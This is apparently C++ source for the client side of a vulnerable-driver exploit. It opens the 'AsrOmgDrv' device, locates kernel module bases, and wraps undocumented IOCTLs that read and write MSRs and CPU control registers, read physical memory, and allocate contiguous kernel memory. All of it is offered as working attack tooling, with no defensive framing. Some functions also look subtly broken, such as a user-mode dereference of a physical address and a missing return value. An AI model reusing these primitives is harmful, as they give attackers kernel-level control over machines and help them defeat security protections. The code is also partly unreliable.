#include "communication.h"

#define READ_PHYS_MEM 0x9C402618
#define WRITE_PHYS_MEM_CTL_CODE 0x9C40261C
#define WRITE_MSR_CTL_CODE 0x9C402608
#define READ_MSR_CTL_CODE 0x9C402604

#define READ_CONTROL_REGISTER_CTL_CODE 2238556 + 16
#define INITIAL_TEST_VALUE 0xEEE9;




uint64_t communication::GetSystemModuleImageBase(const char* SystemModuleName) {
	void* pModuleBuffer = nullptr;
	unsigned long Bytes = 0;


	// Query system information to fille PRTL_PROCESS_MODULES structure
	NTSTATUS StatusCode = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(native::SystemModuleInformation), pModuleBuffer, Bytes, &Bytes);
	if (StatusCode == 0xC0000004) {

		if (pModuleBuffer != nullptr) VirtualFree(pModuleBuffer, NULL, MEM_RELEASE);

		// Re-allocate the buffer
		pModuleBuffer = VirtualAlloc(nullptr, Bytes, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		StatusCode = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(native::SystemModuleInformation), pModuleBuffer, Bytes, &Bytes);
	}

	if (!NT_SUCCESS(StatusCode)) {
		if (pModuleBuffer != nullptr) VirtualFree(pModuleBuffer, NULL, MEM_RELEASE);
		std::cout << "Could not query system information " << GetLastError() << " \n";
		return false;
	}

	native::PRTL_PROCESS_MODULES AllocatedModuleBuffer = static_cast<decltype(AllocatedModuleBuffer)>(pModuleBuffer);
	native::PRTL_PROCESS_MODULE_INFORMATION pModuleInformation = AllocatedModuleBuffer->Modules;

	if (!AllocatedModuleBuffer) return false;

	uint64_t ImageBaseAddress = 0;

	for (int index = 0; index < AllocatedModuleBuffer->NumberOfModules; index++)
	{
		std::string CurrentModuleName = std::string(reinterpret_cast<char*>(pModuleInformation[index].FullPathName) + pModuleInformation[index].OffsetToFileName);
		if (!strcmp(CurrentModuleName.c_str(), SystemModuleName)) {
			ImageBaseAddress = (uint64_t)pModuleInformation[index].ImageBase;
			break;
		}
	}

	if (pModuleBuffer != nullptr) VirtualFree(pModuleBuffer, NULL, MEM_RELEASE);
	return ImageBaseAddress;
}

void* communication::OpenDriverHandle()
{
	if (load_signed::IsDriverRunning()) {
		return CreateFileA("\\\\.\\AsrOmgDrv", FILE_ANY_ACCESS, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
	}
	return nullptr;
}

void communication::InitGlobalHandle()
{
	GlobalDriverHandle = OpenDriverHandle();
}

unsigned long long communication::ReadMsr(unsigned long ModelSpecificRegister)
{
	if (!GlobalDriverHandle || GlobalDriverHandle == nullptr || GlobalDriverHandle == INVALID_HANDLE_VALUE)
	{
		logOutput::LogError("Could not open handle to driver");
		logOutput::LogError("Initialise GlobalDriverHandle");
		return false;
	}

	ULONG Buffer[2] = {};
	Buffer[0] = ModelSpecificRegister;

	DWORD BytesReturned;
	BOOL Status = DeviceIoControl(GlobalDriverHandle, READ_MSR_CTL_CODE, &Buffer, sizeof(Buffer), &Buffer, sizeof(Buffer), &BytesReturned, nullptr);
	if (!Status || BytesReturned != 8)
	{
		logOutput::LogErrorGLA("DeviceControlError ", GetLastError());
		return false;
	}

	uint64_t Value = ((uint64_t)*Buffer << 32) | Buffer[1];
	return Value;

}

uintptr_t communication::ReadPhysicalMemory(void* PhysicalAddress, unsigned long NumberOfBytes)
{
	if (!GlobalDriverHandle || GlobalDriverHandle == nullptr || GlobalDriverHandle == INVALID_HANDLE_VALUE)
	{
		logOutput::LogError("Could not open handle to driver");
		logOutput::LogError("Initialise GlobalDriverHandle");
		return false;
	}

	READ_PHYSICAL_MEMORY readMemory;
	readMemory.PhysAddPtr = PhysicalAddress;
	readMemory.NumberOfBytes = NumberOfBytes;

	DWORD BytesReturned;
	BOOL ret = DeviceIoControl(GlobalDriverHandle, READ_PHYS_MEM, &readMemory, sizeof(readMemory), nullptr, NULL, &BytesReturned, NULL);
	if (BytesReturned && !ret) return FALSE;
	return *reinterpret_cast<uintptr_t*>(readMemory.PhysAddPtr);
}



std::pair<DWORDLONG, DWORD> communication::AllocateContigiousMemory(ULONG NumberOfBytes)
{
	if (!GlobalDriverHandle || GlobalDriverHandle == INVALID_HANDLE_VALUE)
	{
		logOutput::LogError("Could not open handle to driver");
		logOutput::LogError("Initialise global driver handle");
		return {};
	}

	DWORDLONG InputArg[2];
	*InputArg = NumberOfBytes;

	DWORD BytesReturned = 5;
	BOOL Status = DeviceIoControl(GlobalDriverHandle, 0x222880, &InputArg, sizeof(InputArg),
		&InputArg, sizeof(InputArg), &BytesReturned,
		nullptr);

	if (!Status && !BytesReturned)
	{
		logOutput::LogErrorGLA("DeviceIoControl Error: ", GetLastError());
		return {};
	}

	return { *(InputArg + 1), BytesReturned };
}

void communication::FreeContiguousMemory(DWORDLONG BaseAddress, DWORDLONG NumberOfBytes)
{
	if (!GlobalDriverHandle || GlobalDriverHandle == INVALID_HANDLE_VALUE)
	{
		logOutput::LogError("Could not open handle to driver");
		logOutput::LogError("Initialise global driver handle");
		return;
	}

	DWORDLONG InputArg[2];
	*InputArg = NumberOfBytes;
	InputArg[1] = BaseAddress;

	DWORD BytesReturned;
	BOOL Status = DeviceIoControl(GlobalDriverHandle, 0x222884, &InputArg, sizeof(InputArg), &InputArg, sizeof(InputArg),
		&BytesReturned, nullptr);


	if (!Status)
	{
		logOutput::LogErrorGLA("DeviceIoControl Error: ", GetLastError());
		return;
	}
}

bool communication::WriteControlRegister(uint64_t ControlRegister, DWORDLONG NewValue)
{
	if (!GlobalDriverHandle || GlobalDriverHandle == INVALID_HANDLE_VALUE)
	{
		logOutput::LogError("Could not open handle to driver");
		logOutput::LogError("Initialise global driver handle");
		return false;
	}

	uint64_t InputArg[2];
	*InputArg = ControlRegister;
	*(InputArg + 1) = NewValue;

	DWORD BytesReturned;
	BOOL Status = DeviceIoControl(GlobalDriverHandle, 2238576, &InputArg, sizeof(InputArg), &InputArg, sizeof(InputArg),
		&BytesReturned, nullptr);

	if (!Status)
	{
		logOutput::LogErrorGLA("DeviceIoControl Error: ", GetLastError());
		return false;
	}
}

DWORDLONG communication::ReadControlRegister(uint64_t ControlRegister)
{
	uint64_t InputBuffer[2];
	*InputBuffer = ControlRegister;

	unsigned long BytesReturned;
	BOOL Status = DeviceIoControl(GlobalDriverHandle, 2238572, &InputBuffer, sizeof(InputBuffer),
		&InputBuffer, sizeof(InputBuffer), &BytesReturned, nullptr);

	if (!Status)
	{
		logOutput::LogErrorGLA("DeviceIoControl Error: ", GetLastError());
		return false;
	}
	return *(InputBuffer + 1);
}